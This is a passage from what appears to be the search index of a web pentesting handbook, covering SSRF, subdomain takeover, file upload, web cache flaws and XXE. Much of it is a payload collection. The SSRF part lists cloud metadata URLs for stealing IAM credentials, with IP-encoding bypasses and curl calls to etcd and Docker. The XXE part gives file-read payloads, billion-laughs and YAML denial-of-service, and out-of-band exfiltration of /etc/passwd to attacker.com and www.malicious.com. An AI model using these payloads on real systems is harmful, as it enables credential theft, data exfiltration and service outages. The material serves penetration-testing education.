decimal with overflow http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal http://0xA9FEA9FE/ Dotless hexadecimal http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow http://0251.0376.0251.0376/ Dotted octal http://0251.00376.000251.0000376/ Dotted octal with padding  </p> <ul> <li>More urls to include  </li> </ul> <p>http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/ http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access http://169.254.169.254/latest/dynamic/instance-identity/document </p>"},{"location":"Pentesting/Web%20Application/ssrf/#google-cloud","title":"Google Cloud","text":""},{"location":"Pentesting/Web%20Application/ssrf/#requires-the-header-metadata-flavor-google-or-x-google-metadata-request-true","title":"Requires the header \"Metadata-Flavor: Google\" or \"X-Google-Metadata-Request: True\"","text":"<p>http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id </p>"},{"location":"Pentesting/Web%20Application/ssrf/#google-allows-recursive-pulls","title":"Google allows recursive pulls","text":"<p>http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true </p>"},{"location":"Pentesting/Web%20Application/ssrf/#google","title":"Google","text":""},{"location":"Pentesting/Web%20Application/ssrf/#beta-does-not-require-a-header-atm-thanks-mathias-karlsson-avlidienbrunn","title":"Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)","text":"<p>http://metadata.google.internal/computeMetadata/v1beta1 </p>"},{"location":"Pentesting/Web%20Application/ssrf/#digital-ocean","title":"Digital Ocean","text":"<p>http://169.254.169.254/metadata/v1.json http://169.254.169.254/metadata/v1/ http://169.254.169.254/metadata/v1/id http://169.254.169.254/metadata/v1/user-data http://169.254.169.254/metadata/v1/hostname http://169.254.169.254/metadata/v1/region http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address </p>"},{"location":"Pentesting/Web%20Application/ssrf/#packetcloud","title":"Packetcloud","text":"<p>https://metadata.packet.net/userdata </p>"},{"location":"Pentesting/Web%20Application/ssrf/#azure","title":"Azure","text":""},{"location":"Pentesting/Web%20Application/ssrf/#limited-maybe-more-exist","title":"Limited, maybe more exist?","text":"<p>http://169.254.169.254/metadata/v1/maintenance </p>"},{"location":"Pentesting/Web%20Application/ssrf/#update-apr-2017-azure-has-more-support-requires-the-header-metadata-true","title":"Update Apr 2017, Azure has more support; requires the header \"Metadata: true\"","text":"<p>https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;format=text </p>"},{"location":"Pentesting/Web%20Application/ssrf/#openstackrackspace","title":"OpenStack/RackSpace","text":"<p>(header required? unknown) http://169.254.169.254/openstack </p>"},{"location":"Pentesting/Web%20Application/ssrf/#hp-helion","title":"HP Helion","text":"<p>(header required? unknown) http://169.254.169.254/2009-04-04/meta-data/ </p>"},{"location":"Pentesting/Web%20Application/ssrf/#oracle-cloud","title":"Oracle Cloud","text":"<p>http://192.0.0.192/latest/ http://192.0.0.192/latest/user-data/ http://192.0.0.192/latest/meta-data/ http://192.0.0.192/latest/attributes/ </p>"},{"location":"Pentesting/Web%20Application/ssrf/#alibaba","title":"Alibaba","text":"<p>http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id </p>"},{"location":"Pentesting/Web%20Application/ssrf/#kubernetes-etcd","title":"Kubernetes ETCD","text":"<p>Can contain API keys and internal ip and ports  </p> <pre><code>curl -L http://127.0.0.1:2379/version\ncurl http://127.0.0.1:2379/v2/keys/?recursive=true\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#docker","title":"Docker","text":"<p>http://127.0.0.1:2375/v1.24/containers/json </p> <p>Simple example </p><pre><code>docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash\nbash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json\nbash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#rancher","title":"Rancher","text":"<pre><code>curl http://rancher-metadata/&lt;version&gt;/&lt;path&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#tools","title":"Tools","text":"<ul> <li> <p>Ground control: https://github.com/jobertabma/ground-control</p> </li> <li> <p>SSRFmap: https://github.com/swisskyrepo/SSRFmap</p> </li> <li> <p>Gopherus: https://github.com/tarunkant/Gopherus</p> </li> <li> <p>SSRF Sheriff: https://github.com/teknogeek/ssrf-sheriff</p> </li> <li> <p>See-SURF: https://github.com/In3tinct/See-SURF</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/ssrf/#automating-ssrf","title":"Automating SSRF","text":"<ul> <li>https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962</li> </ul>"},{"location":"Pentesting/Web%20Application/ssrf/#references","title":"References","text":"<ul> <li> <p>AWS</p> </li> <li> <p>Google Cloud</p> </li> <li> <p>Digital Ocean</p> </li> <li> <p>Azure</p> </li> <li> <p>Rancher</p> </li> <li> <p>Bypass against a weak parser</p> </li> <li> <p>Bypass using IPv6/IPv4 Address Embedding</p> </li> <li> <p>https://portswigger.net/web-security/ssrf</p> </li> <li> <p>https://medium.com/swlh/intro-to-ssrf-beb35857771f</p> </li> <li> <p>https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</p> </li> <li> <p>https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978</p> </li> <li> <p>https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0</p> </li> <li> <p>https://github.com/jdonsec/AllThingsSSRF</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/","title":"Subdomain Enumeration &amp; Takeover","text":""},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#subdomain-enumeration-takeover","title":"Subdomain Enumeration &amp; Takeover","text":""},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#subdomain-enumeration","title":"Subdomain Enumeration","text":"<p>Subdomain enumeration is the process of finding valid subdomains for one or more domains &amp; Subdomain takeover is a process of registering a non-existing domain name to gain control over another domain.</p>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#subdomain-takeover","title":"Subdomain Takeover","text":"<p>Use the following tools to enumerate subdomains</p> <p>Some basic's below</p>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#dns","title":"DNS","text":"<ul> <li>When a web address is accessed eg. \"www.xyz.com\", a DNS query is performed across a DNS server with the host name.</li> <li>The DNS server takes the hostname and resolves it into a numeric IP address</li> </ul>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#cname","title":"CNAME","text":"<ul> <li>An alias of domain name to another domain name</li> <li>In the example below, xyz.company.com is a source domain and xyz.cloudservice.com is a canonical domain name.</li> </ul> <ul> <li>Subdomains map themselves to a specific IP, 3<sup>rd</sup> party services like Azure, AWS, Heroku, Github, Fastly, Shopify, etc. to serve the contents. These subdomains use a CNAME record to another domain [eg. xyz.company.com CNAME xyz.cloudservice.com]</li> <li>Now due to whatever reason, the company decides to stop utilizing this service and to save some bucks, the company cancels the subscription of the 3<sup>rd</sup> party cloud service provider.</li> <li>But, the company forgets to update or simply remove the CNAME record in the DNS zone file</li> <li>Since the CNAME record is not deleted from company.com DNS zone, anyone who registers xyz.cloudservice.com has full control over xyz.company.com until the DNS record is present.</li> </ul>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#case-cname-available-to-buy","title":"Case : CNAME available to buy","text":"<ul> <li>There are cases when the CNAME that a subdomain points to, is available to buy.</li> <li>In that case the attacker can directly buy that domain and host his/her content.</li> </ul>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#enumeration-tools","title":"Enumeration tools","text":"<p>Use the following tools to enumerate subdomains</p> <ul> <li> <p>https://github.com/OWASP/Amass/</p> </li> <li> <p>https://github.com/michenriksen/aquatone</p> </li> <li> <p>https://github.com/Edu4rdSHL/findomain</p> </li> <li> <p>https://github.com/blechschmidt/massdns</p> </li> <li> <p>https://github.com/tomnomnom/assetfinder</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#takeover-tools","title":"Takeover tools","text":"<p>The following tools are designed to scan a list of subdomains concurrently and identify ones that are able to be hijacked.</p> <ul> <li> <p>https://github.com/anshumanbh/tko-subs</p> </li> <li> <p>https://github.com/haccer/subjack</p> </li> <li> <p>https://github.com/shmilylty/OneForAll</p> </li> <li> <p>https://github.com/smaranchand/bucky</p> </li> <li> <p>https://github.com/mxm0z/awesome-sec-s3 S3buckets tools</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#subdomain-takeover-pocs","title":"Subdomain Takeover POC's","text":"Engine Status Fingerprint Discussion Documentation Agile CRM Vulnerable <code>Sorry, this page is no longer available.</code> Issue #145 Airee.ru Vulnerable Issue #104 Anima Vulnerable <code>If this is your website and you've just created it, try refreshing in a minute</code> Issue #126 Anima Documentation Akamai Not vulnerable Issue #13 AWS/S3 Vulnerable <code>The specified bucket does not exist</code> Issue #36 Bitbucket Vulnerable <code>Repository not found</code> Campaign Monitor Vulnerable <code>Trying to access your account?</code> Support Page Cargo Collective Vulnerable <code>404 Not Found</code> Cargo Support Page Cloudfront Not vulnerable ViewerCertificateException Issue #29 Domain Security on Amazon CloudFront Desk Not vulnerable <code>Please try again or try Desk.com free for 14 days.</code> Issue #9 Digital Ocean Vulnerable Domain uses DO name serves with no records in DO. Fastly Edge case <code>Fastly error: unknown domain:</code> Issue #22 Feedpress Vulnerable <code>The feed has not been found.</code> HackerOne #195350 Firebase Not vulnerable Issue #128 Fly.io Vulnerable <code>404 Not Found</code> Issue #101 Freshdesk Not vulnerable Freshdesk Support Page Gemfury Vulnerable <code>404: This page could not be found.</code> Issue #154 Article Ghost Vulnerable <code>The thing you were looking for is no longer here, or never was</code> Github Vulnerable <code>There isn't a Github Pages site here.</code> Issue #37 Issue #68 Gitlab Not vulnerable HackerOne #312118 Google Cloud Storage Not vulnerable HatenaBlog vulnerable <code>404 Blog is not found</code> Help Juice Vulnerable <code>We could not find what you're looking for.</code> Help Juice Support Page Help Scout Vulnerable <code>No settings were found for this company:</code> HelpScout Docs Heroku Edge case <code>No such app</code> Issue #38 Instapage Not vulnerable Issue #73 Intercom Vulnerable <code>Uh oh. That page doesn't exist.</code> Issue #69 Help center JetBrains Vulnerable <code>is not a registered InCloud YouTrack</code> YouTrack InCloud Help Page Key CDN Not vulnerable Issue #112 Kinsta Vulnerable <code>No Site For Domain</code> Issue #48 kinsta-add-domain LaunchRock Vulnerable <code>It looks like you may have taken a wrong turn somewhere. Don't worry...it happens to all of us.</code> Issue #74 Mashery Edge Case <code>Unrecognized domain</code> HackerOne #275714, Issue #14 Microsoft Azure Vulnerable Issue #35 Netlify Edge Case Issue #40 Ngrok Vulnerable <code>Tunnel *.ngrok.io not found</code> Issue #92 Ngrok Documentation Pantheon Vulnerable <code>404 error unknown site!</code> Issue #24 Pantheon-Sub-takeover Pingdom Vulnerable <code>This public report page has not been activated by the user</code> Issue #144 Support Page Readme.io Vulnerable <code>Project doesnt exist... yet!</code> Issue #41 Sendgrid Not vulnerable Shopify Edge Case <code>Sorry, this shop is currently unavailable.</code> Issue #32, Issue #46 Medium Article SmartJobBoard Vulnerable <code>This job board website is either expired or its domain name is invalid.</code> Issue #139 Support Page Squarespace Not vulnerable Statuspage Vulnerable Visiting the subdomain will redirect users to https://www.statuspage.io. PR #105 Statuspage documentation Strikingly Vulnerable <code>page not found</code> Issue #58 Strikingly-Sub-takeover Surge.sh Vulnerable <code>project not found</code> Surge Documentation Tumblr Edge Case <code>Whatever you were looking for doesn't currently exist at this address</code> Tilda Edge Case <code>Please renew your subscription</code> PR #20 Uberflip Vulnerable <code>Non-hub domain, The URL you've accessed does not provide a hub.</code> Issue #150 Uberflip Documentation Unbounce Edge Case <code>The requested URL was not found on this server.</code> Issue #11 Uptimerobot Vulnerable <code>page not found</code> Issue #45 Uptimerobot-Sub-takeover UserVoice Vulnerable <code>This UserVoice subdomain is currently available!</code> Webflow Edge Case <code>The page you are looking for doesn't exist or has been moved.</code> Issue #44 forum webflow Wordpress Vulnerable <code>Do you want to register *.wordpress.com?</code> Worksites Vulnerable <code>Hello! Sorry, but the website you&amp;rsquo;re looking for doesn&amp;rsquo;t exist.</code> Issue #142 WP Engine Not vulnerable Zendesk Not vulnerable <code>Help Center Closed</code> Issue #23 Zendesk Support"},{"location":"Pentesting/Web%20Application/subdomain-enumeration/#references","title":"References","text":"<ul> <li> <p>https://www.notion.so/Subdomain-Enumaration-5109690b9db14b41b02b373af8234c93</p> </li> <li> <p>https://blog.sweepatic.com/art-of-subdomain-enumeration/</p> </li> <li> <p>https://t.co/DHOPzXoeAc?amp=1</p> </li> <li> <p>https://0xpatrik.com/</p> </li> <li> <p>https://github.com/EdOverflow/can-i-take-over-xyz</p> </li> <li> <p>https://www.youtube.com/watch?v=xCunHBH8ZQ4</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/unristricted-file-upload/","title":"Unristricted file upload","text":""},{"location":"Pentesting/Web%20Application/unristricted-file-upload/#unristricted-file-upload","title":"Unristricted file upload","text":""},{"location":"Pentesting/Web%20Application/unristricted-file-upload/#what-is-unristricted-file-upload","title":"What is Unristricted File Upload?","text":"<p>Unrestricted file upload is a vulnerability where users can upload files without proper validation or restrictions. This can allow attackers to upload malicious files, such as scripts or executables, which can then be executed on the server. It poses a significant security risk as it enables attackers to compromise the server, steal sensitive data, or launch further attacks on users accessing the application.</p>"},{"location":"Pentesting/Web%20Application/unristricted-file-upload/#unristricted-file-upload-handbook","title":"Unristricted File Upload Handbook","text":"<ul> <li>File Upload Restrictions Bypass</li> <li>Unrestricted File Upload</li> </ul>"},{"location":"Pentesting/Web%20Application/unristricted-file-upload/#references","title":"References","text":"<ul> <li> <p>https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload</p> </li> <li> <p>https://portswigger.net/web-security/file-upload</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/web-app-pentest-checklist/","title":"Web App Pentest Checklist","text":""},{"location":"Pentesting/Web%20Application/web-app-pentest-checklist/#web-app-pentest-checklist","title":"Web App Pentest Checklist","text":""},{"location":"Pentesting/Web%20Application/web-app-pentest-checklist/#what-is-web-application-penetration-testing-checklist","title":"What is Web Application Penetration Testing Checklist?","text":"<p>A Checklist is a structured document outlining steps and tests to assess the security posture of a web application. It typically includes tasks like identifying entry points, testing for common vulnerabilities (e.g., SQL injection, cross-site scripting), assessing authentication mechanisms, reviewing access controls, examining session management, and scrutinizing data handling processes. Additionally, it covers areas such as error handling, security headers, encryption usage, and compliance with security best practices.</p>"},{"location":"Pentesting/Web%20Application/web-app-pentest-checklist/#checklist","title":"Checklist","text":"<ul> <li> <p>Web Application Pentesting Checklist This checklist is made by Chintan Gurjar</p> </li> <li> <p>OWASP Wep Application Penetration testing Checklist</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/web-cache-deception/","title":"Web Cache Deception","text":""},{"location":"Pentesting/Web%20Application/web-cache-deception/#web-cache-deception","title":"Web Cache Deception","text":""},{"location":"Pentesting/Web%20Application/web-cache-deception/#what-is-web-cache-deception","title":"What is Web Cache Deception","text":"<p>Web Cache Deception is a security flaw where an attacker tricks a web cache into storing sensitive information intended for one user and serving it to another. By manipulating URLs or HTTP headers, attackers exploit misconfigurations to cache private data, such as user-specific pages or authentication tokens. Subsequently, when another user requests the same resource, the cache inadvertently serves the sensitive data, leading to potential data exposure or unauthorized access.</p>"},{"location":"Pentesting/Web%20Application/web-cache-deception/#web-cache-deception-handbook","title":"Web Cache Deception Handbook","text":"<ul> <li>Web Cache Deception attack</li> </ul>"},{"location":"Pentesting/Web%20Application/web-cache-deception/#tools","title":"Tools","text":"<ul> <li>Web Cache Deception</li> </ul>"},{"location":"Pentesting/Web%20Application/web-cache-poisoning/","title":"Web cache poisoning","text":""},{"location":"Pentesting/Web%20Application/web-cache-poisoning/#what-is-web-cache-poisoning","title":"What is Web Cache Poisoning?","text":"<p>Web cache poisoning is a security vulnerability where attackers manipulate the content stored in a web cache to serve malicious or unauthorized content to users. By exploiting weaknesses in caching mechanisms, attackers can inject harmful scripts, redirect traffic to malicious sites, or hijack user sessions. This poses risks such as cross-site scripting (XSS) attacks, data theft, and unauthorized access to sensitive information.</p>"},{"location":"Pentesting/Web%20Application/web-cache-poisoning/#reference","title":"Reference","text":"<ul> <li> <p>https://portswigger.net/web-security/web-cache-poisoning</p> </li> <li> <p>https://brutelogic.com.br/blog/xss-via-http-headers/</p> </li> <li> <p>Black Hat Web-Cache-Deception-Attack</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/xxe/","title":"XML External Entities (XXE)","text":""},{"location":"Pentesting/Web%20Application/xxe/#xml-external-entities-xxe","title":"XML External Entities (XXE)","text":""},{"location":"Pentesting/Web%20Application/xxe/#what-is-xxe-attack","title":"What is XXE Attack?","text":"<p>An XML External Entity (XXE) attack (sometimes called an XXE injection attack) is a type of attack that abuses a widely available but rarely used feature of XML parsers. Using XXE, an attacker is able to cause Denial of Service (DoS) as well as access local and remote content and services. XXE can be used to perform Server Side Request Forgery (SSRF) inducing the web application to make requests to other applications. In some cases, XXE may even enable port scanning and lead to remote code execution.</p>"},{"location":"Pentesting/Web%20Application/xxe/#types-of-xxe","title":"Types of XXE","text":"<ul> <li>Inband XXE</li> <li>Error-based XXE</li> <li>Out-of-band XML External Entity (OOB-XXE)</li> </ul>"},{"location":"Pentesting/Web%20Application/xxe/#inband-xxe","title":"Inband XXE","text":"<p>In-band XXE attacks are more common and let the attacker receive an immediate response to the XXE payload.</p>"},{"location":"Pentesting/Web%20Application/xxe/#blind-xxe","title":"Blind XXE","text":"<p>Error-based and Out-of-band XXE are its types.</p>"},{"location":"Pentesting/Web%20Application/xxe/#error-based-xxe","title":"Error-based XXE","text":"<p>It's a bit like Blind XXE, here you get to see some error's and we need to escalate it  future to show the impact.</p>"},{"location":"Pentesting/Web%20Application/xxe/#out-of-band-xml-external-entity-oob-xxe","title":"Out-of-band XML External Entity (OOB-XXE)","text":"<p>Out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application. here, we cannot retrieve the server-side files directly, making it harder to find, but definitely its possible after some smart/hard work.</p>"},{"location":"Pentesting/Web%20Application/xxe/#payloads","title":"Payloads","text":""},{"location":"Pentesting/Web%20Application/xxe/#detect-the-vulnerability","title":"Detect the vulnerability","text":"<p>Basic entity test, when the XML parser parses the external entities the result should contain \"John\" in <code>firstName</code> and \"Doe\" in <code>lastName</code>. Entities are defined inside the <code>DOCTYPE</code> element.</p> <pre><code>&lt;!--?xml version=\"1.0\" ?--&gt;\n&lt;!DOCTYPE replace [&lt;!ENTITY example \"Doe\"&gt; ]&gt;\n &lt;userInfo&gt;\n  &lt;firstName&gt;John&lt;/firstName&gt;\n  &lt;lastName&gt;&amp;example;&lt;/lastName&gt;\n &lt;/userInfo&gt;\n</code></pre> <p>It might help to set the <code>Content-Type: application/xml</code> in the request when sending XML payload to the server.</p>"},{"location":"Pentesting/Web%20Application/xxe/#exploiting-xxe-to-retrieve-files","title":"Exploiting XXE to retrieve files","text":""},{"location":"Pentesting/Web%20Application/xxe/#classic-xxe","title":"Classic XXE","text":"<p>We try to display the content of the file <code>/etc/passwd</code></p> <pre><code>&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE data [\n&lt;!ELEMENT data (#ANY)&gt;\n&lt;!ENTITY file SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;data&gt;&amp;file;&lt;/data&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n  &lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre> <p>\u26a0\ufe0f <code>SYSTEM</code> and <code>PUBLIC</code> are almost synonym.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [  \n  &lt;!ELEMENT foo ANY &gt;\n  &lt;!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#classic-xxe-base64-encoded","title":"Classic XXE Base64 encoded","text":"<pre><code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"&gt; %init; ]&gt;&lt;foo/&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#php-wrapper-inside-xxe","title":"PHP Wrapper inside XXE","text":"<pre><code>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt; ]&gt;\n&lt;contacts&gt;\n  &lt;contact&gt;\n    &lt;name&gt;Jean &amp;xxe; Dupont&lt;/name&gt;\n    &lt;phone&gt;00 11 22 33 44&lt;/phone&gt;\n    &lt;adress&gt;42 rue du CTF&lt;/adress&gt;\n    &lt;zipcode&gt;75000&lt;/zipcode&gt;\n    &lt;city&gt;Paris&lt;/city&gt;\n  &lt;/contact&gt;\n&lt;/contacts&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" &gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xinclude-attacks","title":"XInclude attacks","text":"<p>When you can't modify the DOCTYPE element use the XInclude to target</p> <pre><code>&lt;foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"&gt;\n&lt;xi:include parse=\"text\" href=\"file:///etc/passwd\"/&gt;&lt;/foo&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#exploiting-xxe-to-perform-ssrf-attacks","title":"Exploiting XXE to perform SSRF attacks","text":"<p>XXE can be combined with the SSRF vulnerability to target another service on the network.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"http://internal.service/secret_pass.txt\" &gt;\n]&gt;\n&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#exploiting-xxe-to-perform-a-deny-of-service","title":"Exploiting XXE to perform a deny of service","text":"<p>\u26a0\ufe0f : These attacks might kill the service or the server, do not use them on the production.</p>"},{"location":"Pentesting/Web%20Application/xxe/#billion-laugh-attack","title":"Billion Laugh Attack","text":"<pre><code>&lt;!DOCTYPE data [\n&lt;!ENTITY a0 \"dos\" &gt;\n&lt;!ENTITY a1 \"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"&gt;\n&lt;!ENTITY a2 \"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"&gt;\n&lt;!ENTITY a3 \"&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;\"&gt;\n&lt;!ENTITY a4 \"&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;\"&gt;\n]&gt;\n&lt;data&gt;&amp;a4;&lt;/data&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#yaml-attack","title":"Yaml attack","text":"<pre><code>a: &amp;a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\nb: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\nf: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\ng: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\nh: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\ni: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#error-based-xxe_1","title":"Error Based XXE","text":"<p>Payload to trigger the XXE</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE message [\n    &lt;!ENTITY % ext SYSTEM \"http://attacker.com/ext.dtd\"&gt;\n    %ext;\n]&gt;\n&lt;message&gt;&lt;/message&gt;\n</code></pre> <p>Contents of ext.dtd</p> <pre><code>&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % eval \"&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;\"&gt;\n%eval;\n%error;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#exploiting-blind-xxe-to-exfiltrate-data-out-of-band","title":"Exploiting blind XXE to exfiltrate data out-of-band","text":"<p>Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.</p>"},{"location":"Pentesting/Web%20Application/xxe/#blind-xxe_1","title":"Blind XXE","text":"<p>The easiest way to test for a blind XXE is to try to load a remote resource such as a Burp Collaborator.</p> <pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE root [\n&lt;!ENTITY % ext SYSTEM \"http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x\"&gt; %ext;\n]&gt;\n&lt;r&gt;&lt;/r&gt;\n</code></pre> <p>Send the content of <code>/etc/passwd</code> to \"www.malicious.com\", you may receive only the first line.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY % xxe SYSTEM \"file:///etc/passwd\" &gt;\n&lt;!ENTITY callhome SYSTEM \"www.malicious.com/?%xxe;\"&gt;\n]\n&gt;\n&lt;foo&gt;&amp;callhome;&lt;/foo&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-oob-attack-yunusov-2013","title":"XXE OOB Attack (Yunusov, 2013)","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE data SYSTEM \"http://publicServer.com/parameterEntity_oob.dtd\"&gt;\n&lt;data&gt;&amp;send;&lt;/data&gt;\n\nFile stored on http://publicServer.com/parameterEntity_oob.dtd\n&lt;!ENTITY % file SYSTEM \"file:///sys/power/image_size\"&gt;\n&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://publicServer.com/?%file;'&gt;\"&gt;\n%all;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-oob-with-dtd-and-php-filter","title":"XXE OOB with DTD and PHP filter","text":"<pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY % sp SYSTEM \"http://127.0.0.1/dtd.xml\"&gt;\n%sp;\n%param1;\n]&gt;\n&lt;r&gt;&amp;exfil;&lt;/r&gt;\n\nFile stored on http://127.0.0.1/dtd.xml\n&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'&gt;\"&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/xxe/#xxe-oob-with-apache-karaf","title":"XXE OOB with Apache Karaf","text":"<p>CVE-2018-11788 affecting versions:</p> <ul> <li>Apache 